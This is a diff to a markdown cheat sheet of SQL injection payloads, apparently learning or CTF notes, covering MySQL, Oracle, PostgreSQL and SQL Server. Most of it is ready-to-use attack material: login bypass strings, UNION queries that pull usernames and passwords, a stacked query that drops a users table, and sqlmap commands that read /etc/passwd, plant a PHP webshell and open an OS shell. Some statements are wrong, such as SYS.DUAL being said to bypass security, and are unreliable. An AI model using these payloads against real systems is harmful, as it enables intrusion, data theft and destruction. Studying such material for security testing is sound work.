@@ -65,40 +65,55 @@ SELECT * FROM dbo.nameTable;
 ## **1. General SQL Injection Techniques**
 
 ### **1.1 Basic SQL Injection**
+
 Injections manipulate input to interfere with SQL queries:
+
 ```sql
 ' OR 1=1 --
 ```
+
 - `'` closes a string, `OR 1=1` always evaluates to true, and `--` comments out the rest of the query.
 - This can bypass authentication or display all records in a table.
 
 ### **1.2 UNION-Based SQL Injection**
+
 Union injection combines the results of multiple `SELECT` queries:
+
 ```sql
 ' UNION SELECT null, username, password FROM users --
 ```
+
 - Here, you try to union data from the `users` table to display usernames and passwords.
 
 ### **1.3 Error-Based SQL Injection**
+
 Error-based injection leverages database errors to gain information about the database structure:
+
 ```sql
 ' AND 1=CONVERT(int, (SELECT @@version)) --
 ```
+
 - This can extract sensitive information such as the database version or table structure.
 
 ### **1.4 Blind SQL Injection**
+
 When the application doesn’t show error messages, you use boolean conditions to infer information:
+
 ```sql
 ' AND 1=1 --   # True, check for valid response
 ' AND 1=2 --   # False, no response
 ```
+
 By determining when a condition is true or false, you can infer database information.
 
 ### **1.5 Time-Based Blind SQL Injection**
+
 This uses time delays to infer data:
+
 ```sql
 ' AND SLEEP(5) -- 
 ```
+
 If the application delays for 5 seconds, you know the query executed successfully.
 
 ---
@@ -106,7 +121,9 @@ If the application delays for 5 seconds, you know the query executed successfull
 ## **2. MySQL Specific SQL Injection**
 
 ### **2.1 Retrieving Database Information**
+
 MySQL allows you to retrieve database information using the `INFORMATION_SCHEMA` tables:
+
 ```sql
 SELECT DATABASE();  -- Get current database name
 SHOW TABLES;  -- Get list of tables
@@ -122,41 +139,50 @@ To dump all data from a table (e.g., `users` table):
 ### **2.3 MySQL Specific Functions**
 - `@@version` – Get MySQL version.
 - `GROUP_CONCAT()` – Combine multiple row values into a single string:
-  ```sql
-  ' UNION SELECT GROUP_CONCAT(username, ':', password) FROM users --
-  ```
+```sql
+' UNION SELECT GROUP_CONCAT(username, ':', password) FROM users --
+```
 
 ---
 
 ## **3. Oracle Specific SQL Injection**
 
 ### **3.1 Retrieving Database Information**
+
 In Oracle, `ALL_TABLES` and `USER_TABLES` can list tables:
+
 ```sql
 SELECT table_name FROM all_tables;  -- List all tables
 SELECT * FROM user_tables;  -- List tables for the current user
 ```
 
 ### **3.2 Oracle Functions**
+
 - `USER` – Get the current database user.
+
 - `DBMS_METADATA.GET_DDL` – Get table DDL (schema definitions).
-  ```sql
-  SELECT DBMS_METADATA.GET_DDL('TABLE', 'table_name') FROM dual;
-  ```
+```sql
+SELECT DBMS_METADATA.GET_DDL('TABLE', 'table_name') FROM dual;
+```
 
 ### **3.3 Accessing Hidden Tables**
+
 ```sql
 SELECT * FROM SYS.HIDDENSECRETTABLE;
 ```
+
 Oracle uses `SYS` schema for system-level tables.
 
 ### **3.4 Extracting Data**
+
 ```sql
 ' UNION SELECT null, username, password FROM users --
 ```
 
 ### **3.5 Oracle Specific Injection for System Tables**
+
 You can use `SYS.DUAL` to bypass security restrictions:
+
 ```sql
 SELECT * FROM SYS.DUAL;
 ```
@@ -166,7 +192,9 @@ SELECT * FROM SYS.DUAL;
 ## **4. PostgreSQL Specific SQL Injection**
 
 ### **4.1 Retrieving Database Information**
+
 PostgreSQL stores system information in `pg_catalog`:
+
 ```sql
 SELECT current_database();  -- Get current database
 SELECT table_name FROM information_schema.tables;  -- List all tables
@@ -174,25 +202,32 @@ SELECT column_name FROM information_schema.columns WHERE table_name = 'users';  
 ```
 
 ### **4.2 PostgreSQL Functions**
+
 - `pg_user` – Retrieves user information.
-  ```sql
+
+```sql
   SELECT * FROM pg_user;
-  ```
+```
 
 - `version()` – Get PostgreSQL version:
-  ```sql
-  SELECT version();
-  ```
+
+```sql
+SELECT version();
+```
 
 ### **4.3 Blind SQL Injection (PostgreSQL)**
+
 PostgreSQL supports error-based and time-based techniques for blind injections:
+
 ```sql
 ' AND 1=1 --  -- Always true
 ' AND 1=2 --  -- Always false
 ```
 
 ### **4.4 UNION-Based Injection**
+
 PostgreSQL can also use the `UNION` keyword to combine query results:
+
 ```sql
 ' UNION SELECT null, username, password FROM users --
 ```
@@ -202,7 +237,9 @@ PostgreSQL can also use the `UNION` keyword to combine query results:
 ## **5. SQL Server (MS SQL) Specific SQL Injection**
 
 ### **5.1 Retrieving Database Information**
+
 In SQL Server, use `INFORMATION_SCHEMA` to get table info:
+
 ```sql
 SELECT DATABASE();  -- Get current database name
 SELECT * FROM INFORMATION_SCHEMA.TABLES;  -- Get all tables
@@ -210,34 +247,42 @@ SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'users';  
 ```
 
 ### **5.2 SQL Server Functions**
+
 - `@@version` – Get SQL Server version:
-  ```sql
-  SELECT @@version;
-  ```
+
+```sql
+SELECT @@version;
+```
 
 - `sysobjects` – List all tables in the database:
-  ```sql
-  SELECT name FROM sysobjects WHERE type = 'U';  -- List user tables
-  ```
+
+```sql
+SELECT name FROM sysobjects WHERE type = 'U';  -- List user tables
+```
 
 - `xp_cmdshell` – Execute system commands (if enabled):
-  ```sql
-  EXEC xp_cmdshell('dir');  -- Get system directory
-  ```
+
+```sql
+EXEC xp_cmdshell('dir');  -- Get system directory
+```
 
 ### **5.3 SQL Server Blind Injection**
+
 Just like MySQL and Oracle, you can use **blind injection** to infer information by checking responses:
+
 ```sql
 ' AND 1=1 --  -- True
 ' AND 1=2 --  -- False
 ```
 
 ### **5.4 Time-Based Blind Injection in SQL Server**
+
 ```sql
 ' WAITFOR DELAY '00:00:05' --  -- Delay execution for 5 seconds
 ```
 
 ### **5.5 UNION Injection**
+
 ```sql
 ' UNION SELECT null, username, password FROM users --
 ```
@@ -369,6 +414,7 @@ extractvalue('',concat('>',version()))
 ```
 
 SQL Server 
+
 ```sql
 cast(@@version as integer)
 ```
@@ -416,7 +462,6 @@ CAST((
 CAST((SELECT name FROM target.sys.tables WHERE name LIKE '%flag%';) as int)
 ```
 
-
 ```sql
 CAST((
   SELECT name 
@@ -459,11 +504,11 @@ To detect and exploit UNION-based SQL Injection vulnerabilities and identify the
 #### or for burp 
 Always URL encode your payload if you paste it into Burp:
 
-    * ' → %27
+    - ' → %27
 
-    * Space → %20
+    - Space → %20
 
-    * -- - → %2D%2D%20-
+    - -- - → %2D%2D%20-
 
 ```sql
 %25%27+order+by+4+--
@@ -540,7 +585,6 @@ The first query runs and returns something.
 
 Then the second query executes and deletes the users table.
 
-
 ### Optional
 if allowed
 
@@ -588,24 +632,24 @@ sqlmap -u "http://sql-injection/exploit/stacked" --technique=S --dbms=PostgreSQL
 
 Option	Purpose
 --
--u	Target URL
-?id=rug	The vulnerable parameter id with test input rug
---technique=S	Only use Stacked queries (S)
---dbms=PostgreSQL	Assume backend is PostgreSQL (helps optimize payloads)
---risk=3 --level=5	Enables more aggressive payloads and parameter coverage
---batch	Auto-confirms prompts for non-interactive use
---time-sec=5 → helps detect time-based blind SQLi (e.g., via pg_sleep)
---flush-session → forces sqlmap to retry scanning from scratch
---data="username=rug" Sends this as the POST body
--r: tells sqlmap to read a raw HTTP request file
+- -u	Target URL
+- ?id=rug	The vulnerable parameter id with test input rug
+- --technique=S	Only use Stacked queries (S)
+- --dbms=PostgreSQL	Assume backend is PostgreSQL (helps optimize payloads)
+- --risk=3 --level=5	Enables more aggressive payloads and parameter coverage
+- --batch	Auto-confirms prompts for non-interactive use
+- --time-sec=5 → helps detect time-based blind SQLi (e.g., via pg_sleep)
+- --flush-session → forces sqlmap to retry scanning from scratch
+- --data="username=rug" Sends this as the POST body
+- -r: tells sqlmap to read a raw HTTP request file
 
 By default, sqlmap tests all parameters (name, sort, order). If only one is vulnerable, you can narrow it down:
 
--p name
+- -p name
 
 Some apps reject POST without Content-Type: application/x-www-form-urlencoded. Add it like so:
 
---headers="Content-Type: application/x-www-form-urlencoded"
+- --headers="Content-Type: application/x-www-form-urlencoded"
 
 Once sqlmap confirms a vulnerability, you can use:
 
@@ -617,15 +661,15 @@ This gives you a live SQL shell — anything you type will be executed directly 
 
 Read files from disk:
 
---file-read=/etc/passwd
+- --file-read=/etc/passwd
 
 Write files (webshells, payloads):
 
---file-write=backdoor.php --file-dest=/var/www/html/shell.php
+- --file-write=backdoor.php --file-dest=/var/www/html/shell.php
 
 Execute OS commands:
 
---os-shell
+- --os-shell
 
 #### Send to sqlmap (optional)
 
@@ -635,11 +679,11 @@ sqlmap -r burp_request.txt --batch --risk=3 --level=5 --technique=S
 
 ### URL-Encoded
 
-;	                %3B
-space ( )	        %20
-' (single quote)	%27
-=	                %3D
--- (comment) 	    -- or --+
+    - ;	                %3B
+    - space ( )	        %20
+    - ' (single quote)	%27
+    - =	                %3D
+    - -- (comment) 	    -- or --+
 
 ### Reading and Writing Files
 
@@ -681,3 +725,5 @@ SELECT * FROM users INTO OUTFILE '/var/lib/mysql-files/test.txt'
 ```sql
 SELECT LOAD_FILE('/var/lib/mysql-files/test.txt')
 ```
+
+
